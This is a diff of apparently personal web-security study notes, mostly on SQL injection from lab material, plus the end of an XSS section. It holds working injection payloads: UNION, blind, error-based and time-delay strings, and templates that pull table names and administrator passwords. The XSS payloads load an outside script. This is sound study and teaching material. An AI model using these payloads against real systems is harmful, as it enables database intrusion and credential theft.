+![image-20240506202501327](https://s2.loli.net/2024/05/09/6ehi2gRypUxOtcw.png)
 
 payload = `<script src="https://xss.haozi.me/j.js"></script>`
 
@@ -3129,7 +3152,7 @@ payload = `<script src="https://xss.haozi.me/j.js"></script>`
 
 内嵌script来绕过 
 
-![image-20240506203022242](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240506203022242.png)
+![image-20240506203022242](https://s2.loli.net/2024/05/09/46Ewx8iHzqbdCyO.png)
 
 payload = `<scrscriptipt src="https://xss.haozi.me/j.js"></scrscriptipt>`
 
@@ -3137,3 +3160,1603 @@ payload = `<scrscriptipt src="https://xss.haozi.me/j.js"></scrscriptipt>`
 
 
 
+# SQLi
+
+
+
+**detect SQL injection vulnerabilities**
+
+You can detect SQL injection manually using a systematic set of tests against every entry point in the application. To do this, you would typically submit:
+
+- The single quote character `'` and look for errors or other anomalies.
+- Some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and look for systematic differences in the application responses.
+- Boolean conditions such as `OR 1=1` and `OR 1=2`, and look for differences in the application's responses.
+- Payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.
+- [OAST](https://portswigger.net/burp/application-security-testing/oast) payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.
+
+
+
+**SQL injection in different parts of the query**
+
+Most SQL injection vulnerabilities occur within the `WHERE` clause of a `SELECT` query. 
+
+However, SQL injection vulnerabilities can occur at any location within the query, and within different query types. Some other common locations where SQL injection arises are:
+
+- In `UPDATE` statements, within the updated values or the `WHERE` clause.
+- In `INSERT` statements, within the inserted values.
+- In `SELECT` statements, within the table or column name.
+- In `SELECT` statements, within the `ORDER BY` clause.
+
+
+
+## BOOLEAN EXPRESSION
+
+
+
+Imagine a shopping application that displays products in different categories. When the user clicks on the **Gifts** category, their browser requests the URL:
+
+```
+https://insecure-website.com/products?category=Gifts
+```
+
+This causes the application to make a SQL query to retrieve details of the relevant products from the database:
+
+```sql
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+"""
+The restriction `released = 1` is being used to hide products that are not released. We could assume for unreleased products, `released = 0`.
+"""
+```
+
+
+
+```
+https://insecure-website.com/products?category=Gifts'--
+```
+
+This results in the SQL query:
+
+```
+SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
+```
+
+As a result, all products are displayed, including those that are not yet released.
+
+
+
+ use a similar attack to display all the products in any category, including categories that they don't know about:
+
+```
+https://insecure-website.com/products?category=Gifts'+OR+1=1--
+```
+
+This results in the SQL query:
+
+```sql
+SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
+```
+
+The modified query returns all items where either the `category` is `Gifts`, or `1` is equal to `1`. As `1=1` is always true, the query returns all items.
+
+
+
+
+
+
+
+
+
+## Examining the database
+
+To exploit SQL injection vulnerabilities, it's often necessary to find information about the database. This includes:
+
+- The type and version of the database software.
+- The tables and columns that the database contains.
+
+
+
+### the database type and version
+
+| Database type    | Query                     |
+| ---------------- | ------------------------- |
+| Microsoft, MySQL | `SELECT @@version`        |
+| Oracle           | `SELECT * FROM v$version` |
+| PostgreSQL       | `SELECT version()`        |
+
+For example, you could use a `UNION` attack with the following input:
+
+```
+' UNION SELECT @@version--
+```
+
+
+
+### Listing the contents of the database
+
+Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.
+
+For example, you can query `information_schema.tables` to list the tables in the database:
+
+```
+SELECT * FROM information_schema.tables
+```
+
+This returns output like the following:
+
+```
+TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE ===================================================== MyDatabase     dbo           Products    BASE TABLE MyDatabase     dbo           Users       BASE TABLE MyDatabase     dbo           Feedback    BASE TABLE
+```
+
+This output indicates that there are three tables, called `Products`, `Users`, and `Feedback`.
+
+You can then query `information_schema.columns` to list the columns in individual tables:
+
+```
+SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+```
+
+This returns output like the following:
+
+```
+TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE ================================================================= MyDatabase     dbo           Users       UserId       int MyDatabase     dbo           Users       Username     varchar MyDatabase     dbo           Users       Password     varchar
+```
+
+This output shows the columns in the specified table and the data type of each column.
+
+
+
+#### LAB
+
+1. **Determine the number of columns being returned by the query** and **which columns contain text data**. 
+
+2. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:
+
+   ```
+   '+UNION+SELECT+'abc','def'--
+   ```
+
+3. Use the following payload to retrieve the list of tables in the database:
+
+   ```
+   '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+   ```
+
+4. Find the name of the table containing user credentials.
+
+5. Use the following payload (replacing the table name) to retrieve the details of the columns in the table:
+
+   ```
+   '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
+   ```
+
+6. Find the names of the columns containing usernames and passwords.
+
+7. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
+
+   ```
+   '+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
+   ```
+
+8. Find the password for the `administrator` user
+
+
+
+### database name
+
+| sql server | DB_NAME ( [ database_id ] ) | The identification number (ID) of the database whose name `DB_NAME` will return. If the call to `DB_NAME` omits *database_id*, `DB_NAME` returns the name of the current database. |
+| ---------- | --------------------------- | ------------------------------------------------------------ |
+| mysql      | DATABASE()                  | `SELECT schema_name FROM information_schema.SCHEMATA;`<br />返回所有数据库的名称列表。 |
+| MariaDB    | DATABASE()                  | `SHOW DATABASES;` 语句来列出所有数据库的名称                 |
+|            |                             |                                                              |
+
+
+
+
+
+
+
+##  UNION attacks
+
+
+
+> ==**When an application is vulnerable to SQL injection, and the results of the query are returned within the application's responses, you can use the `UNION` keyword to retrieve data from other tables within the database. This is commonly known as a SQL injection UNION attack.**==
+
+**The `UNION` keyword enables you to execute one or more additional `SELECT` queries and append the results to the original query**
+
+
+
+For a `UNION` query to work, two key **requirements** must be met:
+
+- The individual queries must return the same number of columns.
+- The data types in each column must be compatible between the individual queries.
+
+
+
+ **This normally involves finding out:**
+
+- How many columns are being returned from the original query.
+- Which columns returned from the original query are of a suitable data type to hold the results from the injected query.
+
+
+
+
+
+### the number of columns 
+
+The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query.
+
+
+
+#### `ORDER BY` 
+
+**injecting a series of `ORDER BY` clauses and incrementing the specified column index until an error occurs.**
+
+
+
+**example**
+
+if the injection point is a quoted string 
+
+```
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+...
+```
+
+When the specified index exceeds the number of actual columns, the database returns an error, such as:
+
+```
+The ORDER BY position number 3 is out of range of the number of items in the select list.
+```
+
+
+
+**Possible Response**
+
+-  return the database error in its HTTP response
+- issue a generic(一般的) error response.
+- return no results at all. 
+
+
+
+
+
+#### `UNION SELECT`
+
+submitting a series of `UNION SELECT` payloads specifying different number of null values:
+
+```
+' UNION SELECT NULL-- 
+' UNION SELECT NULL,NULL-- 
+' UNION SELECT NULL,NULL,NULL-- 
+etc.
+```
+
+use `NULL` as the values because the data types in each column must be compatible . `NULL` is convertible to every common data type, so it maximizes the chance that the payload will succeed when the column count is correct.
+
+
+
+If the number of nulls does not match the number of columns, the database returns an error, such as:
+
+```
+All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
+```
+
+
+
+**Response**
+
+- return the database error in its HTTP response
+- return a generic error
+-  simply return no results. 
+
+When the number of nulls matches the number of columns, the database returns an additional row in the result set, containing null values in each column. 
+
+The effect on the HTTP response depends on application's code. If you are lucky, you will see some additional content within the response, such as an extra row on an HTML table. Otherwise, the null values might trigger a different error, such as a `NullPointerException`. 
+
+In the worst case, the response might look the same as a response caused by an incorrect number of nulls. This would make this method ineffective.
+
+
+
+### Finding columns containing text
+
+Note : 这是必不可少的一步，否则可能因为无法数据类型转换导致语法错误
+
+After determining the number of required columns, you can probe each column to test whether it can hold string data.
+
+submit a series of `UNION SELECT` payloads that place a string value into each column in turn. 
+
+For example, if the query returns four columns, you would submit:
+
+```
+' UNION SELECT 'a',NULL,NULL,NULL-- ' UNION SELECT NULL,'a',NULL,NULL-- ' UNION SELECT NULL,NULL,'a',NULL-- ' UNION SELECT NULL,NULL,NULL,'a'--
+```
+
+**If the column data type is not compatible with string data, the injected query will cause a database error**, such as:
+
+```
+Conversion failed when converting the varchar value 'a' to data type int.
+```
+
+> **If an error does not occur, and the application's response contains  additional content including the injected string value, then the relevant column is suitable for retrieving string data.**
+
+
+
+## Blind SQL injection
+
+Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.
+
+Many techniques such as [`UNION` attacks](https://portswigger.net/web-security/sql-injection/union-attacks) are not effective with blind SQL injection vulnerabilities. This is because they rely on being able to see the results of the injected query within the application's responses. It is still possible to exploit blind SQL injection to access unauthorized data, but different techniques must be used.
+
+
+
+### triggering conditional responses
+
+Consider an application that uses tracking cookies to gather analytics . 
+
+Requests to the application include a cookie header like this: `Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`
+
+and the application uses a SQL query to determine whether this is a known user:  `SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`
+
+
+
+This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave differently depending on whether the query returns any data.If you submit a recognized `TrackingId`, the query returns data and you receive a "Welcome back" message in the response.
+
+You can retrieve information by triggering different responses conditionally
+
+suppose that two requests are sent containing the following `TrackingId` cookie values in turn:
+
+```
+…xyz' AND '1'='1 
+…xyz' AND '1'='2
+```
+
+- the injected `AND '1'='1` condition is true. So the "Welcome back" message is displayed.
+-  the injected `…xyz' AND '1'='2` is false. The "Welcome back" message is not displayed.
+
+This allows us to determine the answer to any single injected condition, and extract data one piece at a time.
+
+
+
+For example, suppose there is a table called `Users` with the columns `Username` and `Password`, and a user called `Administrator`. You can determine the password by sending a series of inputs to test the password one character at a time.
+
+```
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
+```
+
+This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than `m`.
+
+Next, change 'm' to 't' ...
+
+continue this process to systematically determine the full password for the `Administrator` user.
+
+
+
+### Error-based SQL injection
+
+refers to cases where you're able to use error messages to either extract or infer sensitive data from the database, even in blind contexts. The possibilities depend on the configuration of the database and the types of errors you're able to trigger:
+
+- induce(诱导) the application to return a specific error response based on **the result of a boolean expression**. 
+-  trigger error messages that output the data returned by the query. 
+
+#### triggering conditional errors
+
+Some applications carry out SQL queries but their behavior doesn't change, regardless of whether the query returns any data. 
+
+You can modify the query so that it causes a database error only if the condition is true
+
+It's often possible to induce the application to return a different response depending on whether a SQL error occurs.
+
+example :
+
+```
+xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
+xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
+```
+
+These inputs use the `CASE` keyword to test a condition and return a different expression depending on whether the expression is true
+
+- With the first input, the `CASE` expression evaluates to `'a'`, which does not cause any error.
+- With the second input, it evaluates to `1/0`, which causes a divide-by-zero error.
+
+Using this technique, you can retrieve data by testing one character at a time:
+
+```
+xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
+```
+
+
+
+##### LAB
+
+1.  let's say the original value of the cookie is `TrackingId=xyz`.
+
+2. Modify the `TrackingId` cookie, appending a single quotation mark to it: `TrackingId=xyz'`
+
+   Verify that an error message is received
+
+![image-20240510111153503](https://s2.loli.net/2024/05/10/J9xcewh8PFOp2Di.png)
+
+3. Now change it to two quotation marks:`TrackingId=xyz''`
+
+   Verify that the error disappears. This suggests that a syntax error (in this case, the unclosed quotation mark) is having a detectable effect on the response.
+
+![image-20240510111409605](https://s2.loli.net/2024/05/10/TAgK4zShU2OvHGf.png)
+
+
+
+4. You now need to **confirm that the server is interpreting the injection as a SQL query** i.e. that the error is a SQL syntax error as opposed to any other kind of error
+
+   ```
+   TrackingId=xyz'||(SELECT '')||'
+   ```
+
+   In this case, notice that the query still appears to be invalid. This may be due to the database type - try specifying a predictable table name in the query:
+
+   ```
+   TrackingId=xyz'||(SELECT '' FROM dual)||'
+   ```
+
+   As you no longer receive an error, this indicates that the target is probably using an Oracle database, which requires all `SELECT` statements to explicitly specify a table name.
+
+
+
+5. Now that you've crafted what appears to be a valid query, try submitting an invalid query while still preserving valid SQL syntax. For example, try querying a non-existent table name:
+
+```
+TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'
+```
+
+This time, an error is returned. This behavior strongly suggests that your injection is being processed as a SQL query by the back-end.
+
+
+
+6. As long as you make sure to  inject syntactically(语法) valid SQL queries, you can use this error response to infer key information about the database. 
+
+    For example, in order to verify that the `users` table exists, send the following query:
+
+   ```
+   TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
+   ```
+
+   As this query does not return an error, you can infer that this table does exist. 
+
+   Note that the `WHERE ROWNUM = 1` condition is important here to prevent the query from returning more than one row, which would break our concatenation.
+
+
+
+7. **exploit this behaviour to test conditions**
+
+   First, submit the following query: 
+
+   ```
+   TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+   ```
+
+Verify that an error message is received.
+
+
+
+8. Now change it to:
+
+```
+TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+```
+
+Verify that the error disappears. This demonstrates that you can trigger an error conditionally on the truth of a specific condition.
+
+
+
+9. test whether specific entries exist in a table. For example, use the following query to check whether the username `administrator` exists:
+
+```
+TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+```
+
+Verify that the condition is true (the error is received), confirming that there is a user called `administrator`.
+
+
+
+10. determine the length of the password of the `administrator` user.
+
+    ```
+    TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+    ```
+
+    ...
+
+    
+
+11. determine its value of each character
+
+    ```
+    TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+    ```
+
+    
+
+12. The application returns an HTTP 500 status code when the error occurs, and an HTTP 200 status code normally. The "Status" column in the Intruder results shows the HTTP status code, so you can easily find the row with 500 in this column. The payload showing for that row is the value of the character at the first position.
+
+![image-20240510163242191](https://s2.loli.net/2024/05/10/bJPClEWD7dLYfGT.png)
+
+ej6wk7o8ixmpy3tf38tp
+
+
+
+#### verbose(冗长的) SQL error messages
+
+Occasionally, you may be able to induce the application to generate an error message that contains some of the data that is returned by the query. This effectively turns an otherwise blind SQL injection vulnerability into a visible one.
+
+**Commenting out（注释） the rest of the query would prevent the superfluous(多余的) single-quote from breaking the syntax.**
+
+
+
+ **`CAST()`** 
+
+It enables you to convert one data type to another.
+
+```
+CAST((SELECT example_column FROM example_table) AS int)
+```
+
+Often, the data that you're trying to read is a string. Attempting to convert this to an incompatible data type may cause an error similar to the following:
+
+```
+ERROR: invalid input syntax for type integer: "Example data"
+```
+
+This type of query may also be useful if a character limit prevents you from triggering conditional responses.
+
+
+
+##### LAB
+
+1. In Repeater, append a single quote to the value of your `TrackingId` cookie 
+
+   ```
+   TrackingId=ogAZZfxtOKUELbuJ'
+   ```
+
+2. In the response, notice the verbose error message. This discloses(泄露) the full SQL query, including the value of your cookie. 
+
+![image-20240510175934967](https://s2.loli.net/2024/05/11/uzRv8DbN7fSPo4s.png)
+
+3. **comment out the rest of the query**, including the extra single-quote character that's causing the error:
+
+   ```
+   TrackingId=ogAZZfxtOKUELbuJ'--
+   ```
+
+ This suggests that the query is now syntactically valid.
+
+
+
+4. cast the returned value to an `int` data type:
+
+   ```
+   TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
+   ```
+
+    now get a error saying that **an `AND` condition must be a boolean expression.**
+
+   modify :
+
+   ```
+   TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
+   ```
+
+   
+
+5. Adapt  `SELECT` statement so that it retrieves usernames from the database:
+
+   ```
+   TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
+   ```
+
+   Observe that you receive the initial error message again. Notice that your query now appears to be truncated due to a character limit. As a result, the comment characters you added to fix up the query aren't included.
+
+
+
+6. Delete the original value of the `TrackingId` cookie to free up some additional characters. Resend the request.
+
+   ```
+   TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
+   ```
+
+
+
+7. receive a new error message,  suggests that the query was run properly, but it unexpectedly returned more than one row.
+
+
+
+8. Modify the query to return only one row:
+
+   ```
+   TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+   ```
+
+   
+
+9.  the error message now leaks the first username from the `users` table:
+
+   ```
+   ERROR: invalid input syntax for type integer: "administrator"
+   ```
+
+
+
+10. Now that you know that the `administrator` is the first user in the table, modify the query  to leak their password:
+
+    ```
+    TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int
+    ```
+
+![image-20240510182602339](https://s2.loli.net/2024/05/11/oqfy2mP36Udepba.png)
+
+
+
+
+
+#### 基于 sql server的报错注入
+
+
+
+##### 类型转换
+
+- `id=1' and 1=(@@version)--+`
+
+`1=(@@version)`语句中括号里的内容当做int类型的数字来处理，但@@version本身是nvarchar类型的字符串，SQL Server在将ncarchar转换为init类型会失败并报错。
+
+
+
+- `id=1' and 1=(select top 1 table_name from information_schema.tables)--+`
+
+由于括号前面有=号，并且select语句查询出来的结果不止一个，因此需要结合top语句把查询结果限制为一个，通过报错方式把结果展示到web页面，然后使用top n语句依次把后面的表名查询出来。
+
+for xml path和quotename语句把结果显示为一行，构造sql语句：
+
+```sql
+select quotename(table_name) from information_schema.tables for xml path('')
+```
+
+
+
+- `convert()`
+
+convert函数是把时间定义一个数据类型（格式），函数形式：
+
+```sql
+convert(data_type(length),data_to_be_converted,style)
+
+# data_type(length)：表示定义数据类型，length代表可选长度
+# data_to_be_converted：表示时间，也就是需要转换的值
+# style：表示规定时间/日期的输出格式
+
+SELECT convert(varchar(20),getdate(),111)
+# varchar(20)表示定义时间为varchar的数据类型，长度为20，getdate函数是用于获取当前的时间，111则代表时间以年/月/日（即2020/07/11）的格式进行输出。
+```
+
+基于convert函数的报错注入：
+
+```sql
+id=1' and 1=convert(int,db_name(),111) --+
+```
+
+
+
+- **cast**
+
+```sql
+cast(expression as data_type)
+```
+
+如果使用cast函数将查询到的数据库名转换成int类型就会报错，并在报错的同时会把查询到的数据库名暴露出来。
+
+`id=1' and 1=cast(db_name() as int) --+`
+
+``id=1' and 1=cast(SELECT group_concat(column_name) FROM information_schemas.columns WHERE table_name = '...'  as int) --+``
+
+
+
+#### mysql 报错注入
+
+
+
+##### `rand()`
+
+- **floor()**:floor(num)函数返回num整数部分，小数部分舍弃。
+- **rand()**:rand()可以产生一个随机的0-1的数字;rand()括号中给予参数，就可以相当于给了一个伪随机数的种子，伪随机数种子不变，那么接下来产生的随机数是固定的。
+- **group by**：group by 列名/列号
+
+```
+mysql> select count(*) from information_schema.tables group by floor(rand(0)*2);
+
+ERROR 1062 (23000): Duplicate entry '1' for key 'group_key'
+```
+
+当进行**count(),group by聚合函数分组计算时,mysql会创建一个虚拟表,虚拟表由主键列和count()列两列组成**,
+
+同时floor(rand(0)2)这个值会被计算多次,这一点很重要,计算多次是指**在取数据表数据使用group by时,进行一次floor(rand(0)2),如果虚拟表中不存在此数据时,那么在往虚拟表插入数据时,floor(rand(0)2)将会再被计算一次**,
+
+接下来分析,取数据表第一条记录时第一次使用group by,计算floor(rand(0)2)的值为0,查询虚拟表发现0这个主键不存在,于是再次计算floor(rand(0)2)结果为1,将1作为主键插入虚拟表,这时主键1的count()值为1,接下来取数据表第二条记录时第二次使用group by,计算floor(rand(0)2),结果为1,然后查询虚拟表,发现1的键值存在,于是count()的值加1,取数据表第三条记录时第三次使用group by,计算floor(rand(0)2)值为0,查询虚拟表,发现0的键值不存在,于是再一次计算floor(rand(0)2),结果为1,当尝试将1插入虚拟表中时,发现主键1已经存在,所以报出主键重复的错误,整个过程中查询了information_schema.tables这个表3条记录发生报错,
+
+这也是报错为什么需要数据表的记录多到至少为3条的原因, 也是为什么选择 `information_schema.tables `表的原因,因为这个表中的记录一定大于三条,由此可知其实还可以选择information_schema.columns,information_schema.schemata等表
+
+
+
+模版 ：
+
+```sql
+union select count(*), concat( `需要检索的目标在此处` ,0x26, floor(rand(0)*2)) x from information_schema.TABLES group by x--
+```
+
+
+
+
+
+获取数据库名
+
+```sql
+union select count(*), concat((select database()),0x26, floor(rand(0)*2)) x from information_schema.TABLES group by x--
+-- 注意select的列数，必要时候可以加一列 select 1
+-- 0x26 是 & , 便于区分数据库名和rand值
+union select count(*),from information_schema.TABLES group by concat((select datebase()),0x26,floor(rand(0)*2))--
+
+```
+
+![image-20240512125837503](https://s2.loli.net/2024/05/12/y2RKEzeQSjFoxPa.png)
+
+
+
+获取表名
+
+```
+UNION SELECT COUNT(*),CONCAT((SELECT group_concat(table_name) FROM information_schema.TABLES WHERE table_schema='数据库名' ), floor(rand(0)*2)) x FROM information_schema.TABLES GROUP BY x --
+```
+
+![image-20240512130847854](https://s2.loli.net/2024/05/12/iHxw9zTGgALtqXP.png)
+
+
+
+或限制 `LIMIT M N`
+
+```
+concat((select table_name from information_schema.tables where table_schema='sqli' limit 1,1),0x26,floor(rand(0)*2))x ...
+```
+
+`LIMIT N OFFSET M ` = `LIMIT M,N ` ,m表示偏移量，n表示返回的行数
+
+
+
+获取列名
+
+```
+UNION SELECT COUNT(*) CONCAT((SELECT group_concat(column_name) FROM information_schema.COLUMNS WHERE table_name='表名'), floor(rand(0)*2)) x FROM information_schema.TABLES GROUP BY x 
+```
+
+![image-20240512152042802](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240512152042802.png)
+
+
+
+获取列值
+
+```
+UNION SELECT COUNT(*) CONCAT((SELECT group_concat(列名)), floor(rand(0)*2)) x FROM information_schema.TABLES GROUP BY x 
+```
+
+
+
+##### `extractvalue()`
+
+用来解析XML数据，从目标XML中返回包含所查询值的字符串
+`EXTRACTVALUE (XML_document, XPath_string);`
+XML_document：String格式，为XML文档对象的名称或文档内容
+XPath_string：Xpath格式的字符串
+
+使用concat()是因为，可以在前面加入字符导致xpath格式非法
+
+
+
+数据库名
+
+```
+id=1 and extractvalue(1,concat(0x7e,database(),0x7e))--
+```
+
+
+
+表名
+
+```
+?id=1 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=数据库名),0x7e))--+
+```
+
+![image-20240512153855408](https://s2.loli.net/2024/05/12/WonpYudN1zfZyqa.png)
+
+
+
+列名
+
+```
+?id=1 and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=表名),0x7e))--+
+```
+
+**MID函数**
+
+> `MID()`函数用于从文本字段中提取字符。 SELECT MID(column_name,start[,length]) FROM table_name;
+
+| 参数        | 描述                                                        |
+| ----------- | ----------------------------------------------------------- |
+| column_name | 必需。要提取字符的字段。                                    |
+| start       | 必需。规定开始位置（起始值是 1）。                          |
+| length      | 可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。 |
+
+- 提取查询结果前16个字符
+
+  ```
+  http://challenge-15c1298fcd91ebd0.sandbox.ctfhub.com:10080/
+  ?id=1 and extractvalue(1,concat(0x7e,mid((select flag from flag),1,16),0
+  ```
+
+
+
+
+
+##### `updatexml`
+
+`pdatexml` 是 MySQL 中的一个函数，用于更新 XML 类型的数据
+
+```sql
+UPDATEXML(xml_target, xpath_expr, new_value)
+```
+
+- `xml_target` 是要更新的 XML 数据。
+- `xpath_expr` 是 XPath 表达式，用于定位要更新的节点。
+- `new_value` 是新的值，用于替换被定位的节点的内容。
+
+注意，`updatexml` 函数在 MySQL 5.1.5 版本中引入，在 MySQL 5.7.8 版本中被弃用，建议使用 XML 的更新语法替代。
+
+
+
+```
+http://challenge-ef508ff6e2beafa1.sandbox.ctfhub.com:10800/?id=1 and updatexml(1, concat (0x7e, (select database()) ),1)
+```
+
+![image-20240512161734531](https://s2.loli.net/2024/05/12/yWTiM3VSbaKAcFL.png)
+
+
+
+```
+http://challenge-ef508ff6e2beafa1.sandbox.ctfhub.com:10800/?id=1 and updatexml(1, concat (0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='sqli') ),1)
+```
+
+![image-20240512161924648](https://s2.loli.net/2024/05/12/pBGLyWSQir1a4sI.png)
+
+
+
+
+
+### triggering time delays
+
+If the application catches database errors when the SQL query is executed and handles them gracefully(优雅地), there won't be any difference in the application's response. This means the previous technique for inducing conditional errors will not work.
+
+In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays depending on whether an injected condition is true or false
+
+ As SQL queries are normally processed synchronously by the application, delaying the execution of a SQL query also delays the HTTP response. This allows you to determine the truth of the injected condition based on the time taken to receive the HTTP response.
+
+
+
+*The techniques for triggering a time delay are specific to the type of database being used.*
+
+For example, on Microsoft SQL Server, 
+
+```
+'; IF (1=2) WAITFOR DELAY '0:0:10'-- 
+'; IF (1=1) WAITFOR DELAY '0:0:10'--
+```
+
+- The first of these inputs does not trigger a delay, because the condition `1=2` is false.
+- The second input triggers a delay of 10 seconds, because the condition `1=1` is true.
+
+Using this technique, we can retrieve data by testing one character at a time:
+
+```
+'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
+```
+
+
+
+
+
+##### LAB
+
+
+
+1. Modify the `TrackingId` cookie, changing it to:
+
+   ```
+   TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+   ```
+
+   Verify that the application takes 10 seconds to respond.
+
+   
+
+   ```
+   TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+   ```
+
+   Verify that the application responds immediately with no time delay. This demonstrates how you can test a single boolean condition and infer the result.
+
+   
+
+2. 
+
+   ```
+   TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+   ```
+
+   Verify that the condition is true, confirming that there is a user called `administrator`.
+
+   
+
+3. determine how many characters are in the password of the `administrator` user. To do this, change the value to:
+
+   ```
+   TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+   ```
+
+   This condition should be true, confirming that the password is greater than 1 character in length.
+
+   
+
+4.  test the character at each position to determine its value.
+
+   ```
+   TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+   ```
+
+   This uses the `SUBSTRING()` function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
+
+   
+
+5. To be able to tell when the correct character was submitted, you'll need to monitor the time taken for the application to respond. For this process to be as reliable as possible, configure the Intruder to issue requests in a single thread. 
+
+   **To do this, go to the "Resource pool" tab and add the attack to a resource pool with the "Maximum concurrent requests" set to `1`.**
+
+   
+
+6. Burp Intruder monitors the time taken for the application's response to be received, but by default it does not show this information. To see it, go to the "Columns" menu, and check the box for "Response received".
+
+   
+
+
+
+
+
+
+
+
+
+## injection cheat sheet
+
+
+
+### String concatenation
+
+concatenate together multiple strings to make a single string.
+
+| Oracle     | `'foo'||'bar'`                                               |
+| ---------- | ------------------------------------------------------------ |
+| Microsoft  | `'foo'+'bar'`                                                |
+| PostgreSQL | `'foo'||'bar'`                                               |
+| MySQL      | `'foo' 'bar'` [Note the space between the two strings] `CONCAT('foo','bar')` |
+
+
+
+### Substring
+
+*extract part of a string from a specified offset with a specified length*. 
+
+**Note that the offset index is 1-based**. Each of the following expressions will return the string `ba`.
+
+| Oracle     | `SUBSTR('foobar', 4, 2)`    |
+| ---------- | --------------------------- |
+| Microsoft  | `SUBSTRING('foobar', 4, 2)` |
+| PostgreSQL | `SUBSTRING('foobar', 4, 2)` |
+| MySQL      | `SUBSTRING('foobar', 4, 2)` |
+
+
+
+
+
+### Comments
+
+| Oracle     | `--comment`                                                  |
+| ---------- | ------------------------------------------------------------ |
+| Microsoft  | `--comment`<br />`/*comment*/`                               |
+| PostgreSQL | `--comment`<br />`/*comment*/`                               |
+| MySQL      | `#comment` <br />`-- comment` [Note the space after the double dash] <br />  `/*comment*/` |
+
+
+
+### Database version
+
+| Oracle     | `SELECT banner FROM v$version  `   <br> `SELECT version FROM v$instance` |
+| ---------- | ------------------------------------------------------------ |
+| Microsoft  | `SELECT @@version`                                           |
+| PostgreSQL | `SELECT version()`                                           |
+| MySQL      | `SELECT @@version`                                           |
+
+
+
+### Database contents
+
+list the tables that exist in the database, and the columns that those tables contain.
+
+| Oracle     | `SELECT * FROM all_tables`<br />`SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'` |
+| ---------- | ------------------------------------------------------------ |
